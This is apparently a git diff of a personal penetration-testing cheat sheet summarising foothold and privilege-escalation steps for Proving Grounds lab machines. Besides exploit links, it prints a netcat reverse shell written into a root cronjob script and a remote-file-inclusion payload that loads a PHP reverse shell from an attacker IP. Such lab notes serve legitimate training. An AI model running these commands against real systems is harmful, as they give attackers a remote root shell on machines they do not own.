@@ -178,69 +178,69 @@ fodhelper.exe
 ## Linux Boxes
 
 **Twiggy**
-  Foothold:
+  - Foothold:
     - curl -v http://192.168.x.x:3000/
     - [Saltstack Exploit]()
-  No privesc
+  - No privesc
 
 **Exfiltrated**
-  Foothold:
+  - Foothold:
     - Subrion Exploit with admin:admin credentials
     - Manually uploaded a .phar file
-  PrivEsc:
+  - PrivEsc:
     - Found a cronjob running every minute
     - /opt/image-exif.sh
     - Exiftool exploit and create malicious jpg file
 
 **Astronaut**
-  Foothold:
+  - Foothold:
     - [GRAV CMS Exploit](https://github.com/CsEnox/CVE-2021-21425/tree/main)
-  PrivEsc:
+  - PrivEsc:
     - Uncommon setuid binaries
     - [/usr/bin/php7.4 exploit](https://gtfobins.github.io/gtfobins/php/#suid)
 
 **Blackgate**
-  Foothold:
+  - Foothold:
     - [Redis 4.0.14 Exploit](https://github.com/Ridter/redis-rce)
-  PrivEsc:
+  - PrivEsc:
     - pwnkit
 
 **Boolean**
-  Foothold: 
+  - Foothold: 
     - Create a useraccount and go checkout confirmation part. We have to intercept the email edit request with burp and add user[confirmed]=true
     - On upload page, when we try downloading files, we can see cwd which means current working directory. We found directory traversal
     - After checking username list we create an ssh key set and add it to authorized keys and upload it to one of the found users and login as that user using ssh -i
-  PrivEsc:
+  - PrivEsc:
     - Check user's .bash_aliases file: our owner has root key and can login as root
     - ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true
 
 **Clue**
-  Foothold:
+  - Foothold:
     - Cassandra Exploit: directory traversal
     - from proc/self/cmdline, we found cassie's name and password -> didn't work for ssh
     - FreeSWITCH mod_event_socket was running so tried exploit and didn't work because password is different
     - Found FreeSWITCH mod_event_socket password through cassandra's exploit
-  PrivEsc: pivoting twice
+  - PrivEsc: pivoting twice
     - Switch user as cassie
     - cassie can run cassandra-web with sudo privilege. since it's running with root privilege, we can grab anything as root
     - Read .bash_history of anthony and figure out that he can login into ssh as root
     - Shell as root
 
 **Law**
-  Foothold:
+  - Foothold:
     - [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
     - Change POST /htmLawedTest.php to POST /
     - Exec code I used is included [Proving Grounds Law writeup](https://www.notion.so/Law-28c97105f0134218b24a14a5fcf2bfc3)
-  PrivEsc: cronjob that wasn't detected by linpeas
+  - PrivEsc: cronjob that wasn't detected by linpeas
     - Run `./pspy64 -pf -i 1000`
     - Check `CMD: UID=0     PID=34261  | /bin/sh -c /var/www/cleanup.sh`
     - /var/www/cleanup.sh is owned by the initial shell user
     - `echo "nc 192.168.45.175 80 -e /bin/sh" > cleanup.sh`
 
 **GLPI**
-  Foothold: [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
+  - Foothold: [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
     - Exec code I used is included [Proving Grounds GLPI writeup](https://www.notion.so/GLPI-changeuserpass-e1451beb5374490b8de5d1558598aaa4)
-  PrivEsc:
+  - PrivEsc:
     - linpeas: Searching passwords in config PHP files
       - /var/www/glpi/config/config_db.php
       - Found db username and password
@@ -254,7 +254,11 @@ fodhelper.exe
       - There is also an active port on 8080
       - Type: [Jetty RCE exploit](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)
 
-
+## Windows Boxes
+  - Foothold: 
+    - Remote File Inclusion/Local File Inclusion
+    - ?page=C:/Windows/System32/drivers/etc/hosts
+    - ?page=http://192.168.45.208/php-rev-shell.php
 
 # SQL
 ## MYSQL: Check if MYSQL is running with privileged account..!
